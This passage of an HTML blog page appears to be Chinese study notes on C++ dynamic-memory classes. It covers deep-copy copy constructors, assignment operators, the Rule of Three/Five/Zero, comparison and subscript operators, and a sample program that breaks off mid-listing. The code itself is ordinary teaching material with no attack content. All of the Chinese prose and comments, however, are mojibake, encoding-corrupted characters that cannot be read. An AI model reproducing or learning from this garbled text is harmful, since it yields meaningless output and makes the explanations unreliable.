è¿™äº›æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ï¼‰ï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°å’Œé»˜è®¤èµ‹å€¼è¿ç®—ç¬¦æ˜¯<strong>ä¸å®‰å…¨</strong>çš„ï¼Œä¼šå¯¼è‡´æµ…å¤åˆ¶ã€å†…å­˜æ³„æ¼å’Œé‡å¤åˆ é™¤ç­‰é—®é¢˜ã€‚</p><p>ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºè¿™æ ·çš„ç±»æä¾›æˆ‘ä»¬è‡ªå·±çš„ã€æ­£ç¡®å®ç°çš„ï¼š</p><ol><li> <strong>ææ„å‡½æ•°:</strong> ç¡®ä¿é‡Šæ”¾æ‰€æœ‰é€šè¿‡ <code>new</code> åˆ†é…çš„èµ„æºã€‚</li><li> <strong>å¤åˆ¶æ„é€ å‡½æ•°:</strong> æ‰§è¡Œ**æ·±å¤åˆ¶ (deep copy)**ï¼Œå³ä¸ºæ–°å¯¹è±¡åˆ†é…è‡ªå·±çš„å†…å­˜ï¼Œå¹¶å°†åŸå§‹å¯¹è±¡çš„æ•°æ®å¤åˆ¶åˆ°æ–°å†…å­˜ä¸­ã€‚</li><li> <strong>å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦:</strong> æ‰§è¡Œ<strong>æ·±å¤åˆ¶</strong>ï¼Œå¹¶æ­£ç¡®å¤„ç†è‡ªæˆ‘èµ‹å€¼ï¼ˆ<code>obj = obj;</code>ï¼‰å’Œé‡Šæ”¾æ—§èµ„æºã€‚</li></ol><p>è¿™é€šå¸¸è¢«ç§°ä¸º<strong>å¤åˆ¶æ§åˆ¶ (Copy Control)</strong> æˆ–éµå¾ª**ä¸‰/äº”/é›¶æ³•åˆ™ (Rule of Three/Five/Zero)**ã€‚å¦‚æœä¸€ä¸ªç±»éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°æˆ–å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œé‚£ä¹ˆå®ƒå¾ˆå¯èƒ½éœ€è¦è‡ªå®šä¹‰æ‰€æœ‰è¿™ä¸‰ä¸ªï¼ˆC++11 å‰çš„ä¸‰æ³•åˆ™ï¼‰ã€‚åœ¨ C++11 ä¸­ï¼Œå¦‚æœéœ€è¦è‡ªå®šä¹‰è¿™ä¸‰ä¸ªä¸­çš„ä»»ä½•ä¸€ä¸ªæˆ–ç§»åŠ¨æ„é€ å‡½æ•°/ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ï¼Œåˆ™å¯èƒ½éœ€è¦è€ƒè™‘æ‰€æœ‰äº”ä¸ªï¼ˆäº”æ³•åˆ™ï¼‰ã€‚æˆ–è€…ï¼Œé€šè¿‡ä½¿ç”¨ RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰åŸåˆ™å’Œæ™ºèƒ½æŒ‡é’ˆç­‰ç°ä»£ C++ æŠ€æœ¯ï¼Œå¯èƒ½å¯ä»¥é¿å…æ‰‹åŠ¨ç®¡ç†å†…å­˜ï¼Œä»è€Œä¸éœ€è¦è‡ªå®šä¹‰è¿™äº›ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼ˆé›¶æ³•åˆ™ï¼‰ã€‚</p><h2 id="12-2-æ”¹è¿›åçš„æ–°-String-ç±»"><a href="#12-2-æ”¹è¿›åçš„æ–°-String-ç±»" class="headerlink" title="12.2 æ”¹è¿›åçš„æ–° String ç±»"></a>12.2 æ”¹è¿›åçš„æ–° String ç±»</h2><p>ä¸Šä¸€èŠ‚æˆ‘ä»¬çœ‹åˆ°äº† <code>StringBad</code> ç±»çš„é—®é¢˜ï¼šç”±äºå®ƒç®¡ç†åŠ¨æ€å†…å­˜ï¼Œç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦æ‰§è¡Œçš„æµ…å¤åˆ¶ï¼ˆåªå¤åˆ¶æŒ‡é’ˆåœ°å€ï¼‰å¯¼è‡´äº†å†…å­˜æ³„æ¼å’Œé‡å¤åˆ é™¤ç­‰ä¸¥é‡é”™è¯¯ã€‚</p><p>ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦éµå¾ª<strong>å¤åˆ¶æ§åˆ¶</strong>åŸåˆ™ï¼ˆæˆ–ç§°ä¸‰/äº”æ³•åˆ™ï¼‰ï¼Œä¸ºç®¡ç†åŠ¨æ€å†…å­˜çš„ç±»æä¾›è‡ªå®šä¹‰çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ã€‚æœ¬èŠ‚æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ”¹è¿›çš„ <code>String</code> ç±»ï¼ˆæ”¾åœ¨ <code>string1.h</code> å’Œ <code>string1.cpp</code> ä¸­ï¼‰ï¼Œå®ƒèƒ½æ­£ç¡®å¤„ç†åŠ¨æ€å†…å­˜ã€‚</p><p><strong>æ ¸å¿ƒæ”¹è¿›ï¼šæ·±å¤åˆ¶ (Deep Copy)</strong></p><p>å…³é”®åœ¨äºå®ç°<strong>æ·±å¤åˆ¶</strong>ï¼Œè€Œä¸æ˜¯æµ…å¤åˆ¶ã€‚æ·±å¤åˆ¶æ„å‘³ç€å½“å¤åˆ¶å¯¹è±¡æ—¶ï¼Œä¸ä»…å¤åˆ¶æ™®é€šæˆå‘˜çš„å€¼ï¼Œè¿˜è¦ä¸ºæŒ‡é’ˆæˆå‘˜æŒ‡å‘çš„æ•°æ®åˆ†é…<strong>æ–°çš„å†…å­˜</strong>ï¼Œå¹¶å°†åŸå§‹æ•°æ®<strong>å¤åˆ¶</strong>åˆ°è¿™å—æ–°å†…å­˜ä¸­ã€‚</p><p><strong>1. å¤åˆ¶æ„é€ å‡½æ•° (Copy Constructor)</strong></p><p>å½“ä¸€ä¸ªå¯¹è±¡éœ€è¦é€šè¿‡åŒç±»å‹çš„å¦ä¸€ä¸ªå¯¹è±¡æ¥åˆå§‹åŒ–æ—¶ï¼ˆä¾‹å¦‚ <code>String s2 = s1;</code> æˆ–æŒ‰å€¼ä¼ é€’å‚æ•°ï¼‰ï¼Œå¤åˆ¶æ„é€ å‡½æ•°ä¼šè¢«è°ƒç”¨ã€‚æˆ‘ä»¬çš„è‡ªå®šä¹‰ç‰ˆæœ¬å¿…é¡»æ‰§è¡Œæ·±å¤åˆ¶ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line"><span class="comment">// Copy Constructor (Deep Copy)</span></span><br><span class="line">String::String(<span class="keyword">const</span> String &amp; st) &#123;</span><br><span class="line">    num_strings++;              <span class="comment">// æ›´æ–°é™æ€è®¡æ•°å™¨</span></span><br><span class="line">    len = st.len;               <span class="comment">// å¤åˆ¶é•¿åº¦</span></span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span> [len + <span class="number">1</span>];   <span class="comment">// *** ä¸ºæ–°å¯¹è±¡åˆ†é…è‡ªå·±çš„å†…å­˜ ***</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, st.str);   <span class="comment">// *** å°†æ•°æ®å¤åˆ¶åˆ°æ–°å†…å­˜ä¸­ ***</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;COPY constructor called for &quot; &lt;&lt; str &lt;&lt; &quot;\n&quot;; // è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œå½“ <code>String s2 = s1;</code> æ‰§è¡Œæ—¶ï¼Œ<code>s2</code> ä¼šæ‹¥æœ‰è‡ªå·±ç‹¬ç«‹çš„ä¸€å—å†…å­˜ï¼Œå…¶ä¸­åŒ…å«ä¸ <code>s1</code> ç›¸åŒå†…å®¹çš„å­—ç¬¦ä¸²å‰¯æœ¬ã€‚<code>s1</code> å’Œ <code>s2</code> çš„ <code>str</code> æŒ‡é’ˆå°†æŒ‡å‘ä¸åŒçš„å†…å­˜åœ°å€ã€‚</p><p><strong>2. èµ‹å€¼è¿ç®—ç¬¦ (Assignment Operator)</strong></p><p>å½“å°†ä¸€ä¸ªå·²å­˜åœ¨çš„å¯¹è±¡èµ‹å€¼ç»™å¦ä¸€ä¸ªå·²å­˜åœ¨çš„å¯¹è±¡æ—¶ï¼ˆä¾‹å¦‚ <code>s2 = s1;</code>ï¼‰ï¼Œèµ‹å€¼è¿ç®—ç¬¦ä¼šè¢«è°ƒç”¨ã€‚å®ƒéœ€è¦åšæ›´å¤šå·¥ä½œï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line"><span class="comment">// Assignment Operator (Deep Copy)</span></span><br><span class="line">String &amp; String::<span class="keyword">operator</span>=(<span class="keyword">const</span> String &amp; st) &#123;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Assignment operator called for &quot; &lt;&lt; str &lt;&lt; &quot;\n&quot;; // è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line">    <span class="comment">// 1. è‡ªæˆ‘èµ‹å€¼æ£€æŸ¥: é˜²æ­¢ obj = obj; å¯¼è‡´æ„å¤–åˆ é™¤</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;st)</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// è¿”å›å½“å‰å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. é‡Šæ”¾æ—§å†…å­˜: é‡Šæ”¾å½“å‰å¯¹è±¡ (*this) åŸæ¥å ç”¨çš„å†…å­˜</span></span><br><span class="line">    <span class="keyword">delete</span> [] str;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. æ·±å¤åˆ¶: ä¸å¤åˆ¶æ„é€ å‡½æ•°ç±»ä¼¼</span></span><br><span class="line">    len = st.len;</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span> [len + <span class="number">1</span>];   <span class="comment">// åˆ†é…æ–°å†…å­˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, st.str);   <span class="comment">// å¤åˆ¶æ•°æ®</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. è¿”å›å¼•ç”¨: è¿”å›å¯¹è°ƒç”¨å¯¹è±¡ (*this) çš„å¼•ç”¨ï¼Œä»¥æ”¯æŒé“¾å¼èµ‹å€¼ (a = b = c)</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå®ç°ç¡®ä¿äº†ï¼š</p><ul><li>  <strong>è‡ªæˆ‘èµ‹å€¼å®‰å…¨:</strong> å¦‚æœå°è¯• <code>s1 = s1;</code>ï¼Œæ“ä½œä¼šç›´æ¥è¿”å›ï¼Œä¸ä¼šé”™è¯¯åœ°é‡Šæ”¾å†…å­˜ã€‚</li><li>  <strong>å†…å­˜ç®¡ç†:</strong> åœ¨å¤åˆ¶æ–°æ•°æ®ä¹‹å‰ï¼Œæ­£ç¡®é‡Šæ”¾äº†å¯¹è±¡åŸæ¥å ç”¨çš„å†…å­˜ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼ã€‚</li><li>  <strong>æ·±å¤åˆ¶:</strong> ä¸ºå¯¹è±¡åˆ†é…äº†æ–°çš„å†…å­˜å¹¶å¤åˆ¶äº†æ•°æ®ã€‚</li></ul><h3 id="12-2-1-ä¿®è®¢åçš„é»˜è®¤æ„é€ å‡½æ•°"><a href="#12-2-1-ä¿®è®¢åçš„é»˜è®¤æ„é€ å‡½æ•°" class="headerlink" title="12.2.1 ä¿®è®¢åçš„é»˜è®¤æ„é€ å‡½æ•°"></a>12.2.1 ä¿®è®¢åçš„é»˜è®¤æ„é€ å‡½æ•°</h3><p>é»˜è®¤æ„é€ å‡½æ•°ç°åœ¨åˆ›å»ºä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯åƒ <code>StringBad</code> é‚£æ ·åˆ›å»ºä¸€ä¸ª â€œC++â€ å­—ç¬¦ä¸²ã€‚è¿™é€šå¸¸æ›´æœ‰ç”¨ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line">String::String() &#123;                  <span class="comment">// default constructor</span></span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1</span>];              <span class="comment">// åˆ†é…è¶³å¤Ÿå­˜å‚¨ç©ºå­—ç¬¦ &#x27;\0&#x27; çš„ç©ºé—´</span></span><br><span class="line">    str[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;                  <span class="comment">// è®¾ç½®ä¸ºç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">    num_strings++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-2-2-æ¯”è¾ƒæˆå‘˜å‡½æ•°"><a href="#12-2-2-æ¯”è¾ƒæˆå‘˜å‡½æ•°" class="headerlink" title="12.2.2 æ¯”è¾ƒæˆå‘˜å‡½æ•°"></a>12.2.2 æ¯”è¾ƒæˆå‘˜å‡½æ•°</h3><p>ä¸ºäº†èƒ½å¤Ÿæ¯”è¾ƒ <code>String</code> å¯¹è±¡ï¼Œæˆ‘ä»¬é‡è½½äº†å…³ç³»è¿ç®—ç¬¦ <code>==</code>, <code>&lt;</code>, <code>&gt;</code>ã€‚è¿™äº›é€šå¸¸å®ç°ä¸º<strong>å‹å…ƒå‡½æ•°</strong>ï¼Œå› ä¸ºæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿæ¯”è¾ƒ <code>string1 == string2</code>ï¼Œå¹¶ä¸”å®ƒä»¬éœ€è¦è®¿é—®ç§æœ‰æˆå‘˜ <code>str</code>ã€‚æˆ‘ä»¬åˆ©ç”¨ C åº“å‡½æ•° <code>strcmp()</code> æ¥è¿›è¡Œæ¯”è¾ƒã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.cpp excerpt (å‹å…ƒå‡½æ•°å®šä¹‰)</span></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> String &amp;st1, <span class="keyword">const</span> String &amp;st2) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">std</span>::<span class="built_in">strcmp</span>(st1.str, st2.str) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>&gt;(<span class="keyword">const</span> String &amp;st1, <span class="keyword">const</span> String &amp;st2) &#123;</span><br><span class="line">    <span class="keyword">return</span> st2 &lt; st1; <span class="comment">// åˆ©ç”¨å·²å®šä¹‰çš„ operator&lt;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> String &amp;st1, <span class="keyword">const</span> String &amp;st2) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">std</span>::<span class="built_in">strcmp</span>(st1.str, st2.str) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-2-3-ä½¿ç”¨ä¸­æ‹¬å·è¡¨ç¤ºæ³•è®¿é—®å­—ç¬¦"><a href="#12-2-3-ä½¿ç”¨ä¸­æ‹¬å·è¡¨ç¤ºæ³•è®¿é—®å­—ç¬¦" class="headerlink" title="12.2.3 ä½¿ç”¨ä¸­æ‹¬å·è¡¨ç¤ºæ³•è®¿é—®å­—ç¬¦"></a>12.2.3 ä½¿ç”¨ä¸­æ‹¬å·è¡¨ç¤ºæ³•è®¿é—®å­—ç¬¦</h3><p>ä¸ºäº†åƒè®¿é—®æ™®é€š C å­—ç¬¦ä¸²æ•°ç»„ä¸€æ ·è®¿é—® <code>String</code> å¯¹è±¡ä¸­çš„å•ä¸ªå­—ç¬¦ï¼ˆä¾‹å¦‚ <code>myString[0]</code>ï¼‰ï¼Œæˆ‘ä»¬é‡è½½äº†ä¸‹æ ‡è¿ç®—ç¬¦ <code>[]</code>ã€‚é€šå¸¸éœ€è¦æä¾›ä¸¤ä¸ªç‰ˆæœ¬ï¼š</p><ul><li>  <strong>é <code>const</code> ç‰ˆæœ¬:</strong> <code>char &amp; operator[](int i);</code> è¿”å›ä¸€ä¸ª <code>char</code> çš„<strong>å¼•ç”¨</strong>ï¼Œå…è®¸ä¿®æ”¹å­—ç¬¦ï¼ˆä¾‹å¦‚ <code>myString[0] = &#39;H&#39;;</code>ï¼‰ã€‚</li><li>  <strong><code>const</code> ç‰ˆæœ¬:</strong> <code>const char &amp; operator[](int i) const;</code> ç”¨äº <code>const</code> String å¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ª <code>const char</code> çš„å¼•ç”¨ï¼Œåªå…è®¸è¯»å–å­—ç¬¦ï¼ˆä¾‹å¦‚ <code>const String greeting = &quot;Hi&quot;; char c = greeting[0];</code>ï¼‰ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line"><span class="comment">// read-write char access for non-const String</span></span><br><span class="line"><span class="keyword">char</span> &amp; String::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) &#123;</span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šä¸ºäº†ç®€åŒ–ï¼Œè¿™é‡Œæ²¡æœ‰æ·»åŠ è¾¹ç•Œæ£€æŸ¥</span></span><br><span class="line">    <span class="keyword">return</span> str[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// read-only char access for const String</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> &amp; String::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šä¸ºäº†ç®€åŒ–ï¼Œè¿™é‡Œæ²¡æœ‰æ·»åŠ è¾¹ç•Œæ£€æŸ¥</span></span><br><span class="line">    <span class="keyword">return</span> str[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>å®é™…åº”ç”¨ä¸­é€šå¸¸éœ€è¦æ·»åŠ è¾¹ç•Œæ£€æŸ¥ï¼ˆæ£€æŸ¥ <code>i</code> æ˜¯å¦åœ¨ <code>0</code> åˆ° <code>len-1</code> çš„æœ‰æ•ˆèŒƒå›´å†…ï¼‰ã€‚</em></p><h3 id="12-2-4-é™æ€ç±»æˆå‘˜å‡½æ•°"><a href="#12-2-4-é™æ€ç±»æˆå‘˜å‡½æ•°" class="headerlink" title="12.2.4 é™æ€ç±»æˆå‘˜å‡½æ•°"></a>12.2.4 é™æ€ç±»æˆå‘˜å‡½æ•°</h3><p>æˆ‘ä»¬ä¿ç•™äº†é™æ€æˆå‘˜ <code>num_strings</code> å’Œé™æ€æˆå‘˜å‡½æ•° <code>HowMany()</code> æ¥è·Ÿè¸ªå·²åˆ›å»ºçš„ <code>String</code> å¯¹è±¡æ•°é‡ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.h excerpt</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> num_strings;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">HowMany</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line"><span class="keyword">int</span> String::num_strings = <span class="number">0</span>; <span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">String::HowMany</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num_strings;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-2-5-è¿›ä¸€æ­¥é‡è½½èµ‹å€¼è¿ç®—ç¬¦"><a href="#12-2-5-è¿›ä¸€æ­¥é‡è½½èµ‹å€¼è¿ç®—ç¬¦" class="headerlink" title="12.2.5 è¿›ä¸€æ­¥é‡è½½èµ‹å€¼è¿ç®—ç¬¦"></a>12.2.5 è¿›ä¸€æ­¥é‡è½½èµ‹å€¼è¿ç®—ç¬¦</h3><p>é™¤äº†ä»å¦ä¸€ä¸ª <code>String</code> å¯¹è±¡èµ‹å€¼ï¼Œæˆ‘ä»¬é€šå¸¸è¿˜å¸Œæœ›èƒ½å¤Ÿç›´æ¥ä» C é£æ ¼å­—ç¬¦ä¸² (<code>const char*</code>) èµ‹å€¼ï¼Œä¾‹å¦‚ <code>myString = &quot;Hello&quot;;</code>ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬é‡è½½äº†å¦ä¸€ä¸ªç‰ˆæœ¬çš„èµ‹å€¼è¿ç®—ç¬¦ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string1.h excerpt</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    String &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> String &amp;); <span class="comment">// String = String</span></span><br><span class="line">    String &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> <span class="keyword">char</span> *);   <span class="comment">// String = &quot;C-string&quot;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string1.cpp excerpt</span></span><br><span class="line">String &amp; String::<span class="keyword">operator</span>=(<span class="keyword">const</span> <span class="keyword">char</span> * s) &#123;</span><br><span class="line">    <span class="keyword">delete</span> [] str;                  <span class="comment">// é‡Šæ”¾æ—§å†…å­˜</span></span><br><span class="line">    len = <span class="built_in">std</span>::<span class="built_in">strlen</span>(s);</span><br><span class="line">    str = <span class="keyword">new</span> <span class="keyword">char</span>[len + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(str, s);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;                   <span class="comment">// è¿”å›å¼•ç”¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨æ”¹è¿›åçš„ String ç±»</strong></p><p>ç°åœ¨ï¼Œä½¿ç”¨è¿™ä¸ªæ”¹è¿›åçš„ <code>String</code> ç±»ï¼ˆå®šä¹‰åœ¨ <code>string1.h</code> å’Œ <code>string1.cpp</code> ä¸­ï¼‰ï¼Œä¹‹å‰å¯¼è‡´é—®é¢˜çš„ä»£ç å¯ä»¥å®‰å…¨è¿è¡Œäº†ã€‚ä¸‹é¢çš„ç¤ºä¾‹ç¨‹åº (<code>sayings1.cpp</code>) å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨è¿™ä¸ªç±»ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sayings1.cpp -- ä½¿ç”¨æ”¹è¿›çš„ String ç±»</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string1.h&quot;</span> <span class="comment">// ä½¿ç”¨ string1.h</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> ArSize = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxLen = <span class="number">81</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    String name; <span class="comment">// è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hi, what&#x27;s your name?\n&gt;&gt; &quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; name; <span class="comment">// è°ƒç”¨ operator&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;, please enter up to &quot;</span> &lt;&lt; ArSize</span><br><span class="line">         &lt;&lt; <span class="string">&quot; short sayings &lt;empty line to quit&gt;:\n&quot;</span>;</span><br><span class="line">    String sayings[ArSize]; <span class="comment">// è°ƒç”¨ ArSize æ¬¡é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">char</span> temp[MaxLen];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ArSize; i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span 